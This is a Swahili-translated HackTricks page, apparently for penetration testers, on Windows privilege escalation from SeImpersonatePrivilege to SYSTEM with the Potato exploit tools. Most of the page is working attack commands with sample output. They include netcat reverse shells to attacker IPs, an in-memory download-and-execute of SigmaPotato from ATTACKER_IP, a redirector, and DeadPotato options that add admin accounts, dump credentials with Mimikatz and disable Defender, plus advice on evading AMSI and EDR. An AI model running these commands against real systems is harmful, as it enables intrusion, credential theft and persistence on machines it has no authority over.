# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato haifanyi kazi** kwenye Windows Server 2019 na Windows 10 build 1809 na kuendelea. Hata hivyo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** zinaweza kutumika kupata vibali vinavyofanana na kufikia upatikanaji wa ngazi ya `NT AUTHORITY\SYSTEM`.** Chapisho hili la blogu: https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/ linaelezea kwa undani kuhusu zana ya `PrintSpoofer`, ambayo inaweza kutumika kuingiza matumizi mabaya ya vibali vya impersonation kwenye hosts za Windows 10 na Server 2019 ambapo JuicyPotato haifanyi kazi tena.

> [!TIP]
> Mbadala wa kisasa unaotunzwa mara kwa mara mwaka 2024–2025 ni SigmaPotato (a fork of GodPotato) ambayo inaongeza matumizi ya in-memory/.NET reflection na msaada uliopanuliwa wa OS. Angalia matumizi mafupi hapa chini na repo katika References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Mahitaji na matatizo ya kawaida

Mbinu zote zifuatazo zinaegemea kutumia vibaya huduma yenye uwezo wa impersonation na iliyo na cheo kutoka muktadha unaomiliki mojawapo ya vibali vifuatavyo:

- SeImpersonatePrivilege (most common) or SeAssignPrimaryTokenPrivilege
- High integrity is not required if the token already has SeImpersonatePrivilege (typical for many service accounts such as IIS AppPool, MSSQL, etc.)

Angalia vibali kwa haraka:
```cmd
whoami /priv | findstr /i impersonate
```
Vidokezo vya uendeshaji:

- Ikiwa shell yako inaendesha chini ya tokeni iliyozuiwa isiyo na SeImpersonatePrivilege (kawaida kwa Local Service/Network Service katika muktadha fulani), rudisha ruhusa za chaguo-msingi za akaunti kwa kutumia FullPowers, kisha endesha Potato. Mfano: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer inahitaji huduma ya Print Spooler iwe inayoendesha na inafikika kupitia endpoint ya RPC ya eneo (spoolss). Katika mazingira yaliyoinakishwa ambapo Spooler imezimwa baada ya PrintNightmare, tumia RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato inahitaji OXID resolver inafikika kwa TCP/135. Ikiwa egress imezuiwa, tumia redirector/port-forwarder (angalia mfano hapa chini). Toleo za zamani zilihitaji -f flag.
- EfsPotato/SharpEfsPotato hutumia MS-EFSR; ikiwa pipe moja imezuiwa, jaribu pipes mbadala (lsarpc, efsrpc, samr, lsass, netlogon).
- Kosa 0x6d3 wakati wa RpcBindingSetAuthInfo kwa kawaida inaonyesha huduma ya uthibitishaji ya RPC isiyojulikana/isayoungwa mkono; jaribu pipe/transport tofauti au hakikisha huduma inayolengwa inaendesha.
- Maforokaji ya "Kitchen-sink" kama DeadPotato hujumuisha moduli za ziada za payload (Mimikatz/SharpHound/Defender off) ambazo zinaingiliana na diski; tarajia utambuzi wa EDR kuwa juu zaidi ikilinganishwa na toleo la asili nyembamba.

## Demo ya Haraka

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Vidokezo:
- Unaweza kutumia -i kuanzisha interactive process katika console ya sasa, au -c kuendesha one-liner.
- Inahitaji Spooler service. Ikiwa imezuiwa, hii itashindwa.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Ikiwa outbound 135 imezuiwa, pivot OXID resolver kupitia socat kwenye redirector yako:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato ni primitive mpya ya matumizi mabaya ya COM iliyotolewa mwishoni mwa 2022 inayolenga service ya **PrintNotify** badala ya Spooler/BITS. Binary hiyo inainstantiate server ya PrintNotify COM, inabadilisha `IUnknown` ya bandia, kisha inasababisha callback yenye ruhusa kupitia `CreatePointerMoniker`. Wakati service ya PrintNotify (inayofanya kazi kama **SYSTEM**) inarudi kuunganishwa, mchakato huo unakopa token iliyorejeshwa na kuanzisha payload iliyotolewa kwa ruhusa kamili.

Key operational notes:

* Inafanya kazi kwenye Windows 10/11 na Windows Server 2012–2022 mradi tu Print Workflow/PrintNotify service imewekwa (ipo hata wakati Spooler ya zamani imezimwa baada ya PrintNightmare).
* Inahitaji context inayoita kuwa na **SeImpersonatePrivilege** (kawaida kwa IIS APPPOOL, MSSQL, na akaunti za huduma za scheduled-task).
* Inakubali amri ya moja kwa moja au mode ya mwingiliano ili uweze kubaki ndani ya console ya asili. Mfano:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Kwa sababu ni kabisa COM-based, hakuna named-pipe listeners au external redirectors zinazohitajika, na hivyo inaweza kutumika kama drop-in replacement kwenye hosts ambapo Defender inazuia RoguePotato’s RPC binding.

Operators kama Ink Dragon wanaendesha PrintNotifyPotato mara tu baada ya kupata ViewState RCE kwenye SharePoint ili kupinda kutoka kwa worker `w3wp.exe` kwenda SYSTEM kabla ya kusanidi ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Kidokezo: Kama pipe moja itashindwa au EDR ikizuia, jaribu pipes nyingine zinazounga mkono:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Vidokezo:
- Inatumika kwenye Windows 8/8.1–11 na Server 2012–2022 wakati SeImpersonatePrivilege inapatikana.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato hutoa toleo mbili zinazolenga service DCOM objects ambazo kwa chaguo-msingi zina RPC_C_IMP_LEVEL_IMPERSONATE. Jenga au tumia binaries zilizotolewa na endesha amri yako:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (imesasishwa GodPotato fork)

SigmaPotato inaongeza vipengele vya kisasa kama in-memory execution kupitia .NET reflection na msaidizi wa PowerShell reverse shell.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- Bendera ya reverse shell iliyojengwa `--revshell` na kuondolewa kwa kikomo cha 1024-char cha PowerShell ili uweze kurusha payloads ndefu zinazopita AMSI kwa mara moja.
- Reflection-friendly syntax (`[SigmaPotato]::Main()`), pamoja na mbinu ya msingi ya kuzuia AV kupitia `VirtualAllocExNuma()` ili kutatiza heuristics rahisi.
- Separate `SigmaPotatoCore.exe` compiled against .NET 2.0 for PowerShell Core environments.

### DeadPotato (marekebisho ya GodPotato 2024 na modules)

DeadPotato inaendelea kutumia impersonation chain ya GodPotato OXID/DCOM lakini inajumuisha wasaidizi wa post-exploitation ili operators waweze kuchukua SYSTEM mara moja na kufanya persistence/collection bila zana za ziada.

Modules za kawaida (zote zinahitaji SeImpersonatePrivilege):

- `-cmd "<cmd>"` — anzisha amri yoyote kama SYSTEM.
- `-rev <ip:port>` — reverse shell ya haraka.
- `-newadmin user:pass` — unda admin wa ndani kwa persistence.
- `-mimi sam|lsa|all` — angusha na endesha Mimikatz ili kutoa credentials (inaandika kwenye disk, inasikika).
- `-sharphound` — endesha SharpHound collection kama SYSTEM.
- `-defender off` — zima real-time protection ya Defender (inasikika sana).

Mifano ya one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Kwa sababu huja na binary za ziada, tarajia alama za juu za AV/EDR; tumia GodPotato/SigmaPotato nyepesi zaidi wakati stealth inapotokuwa muhimu.

## Marejeo

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
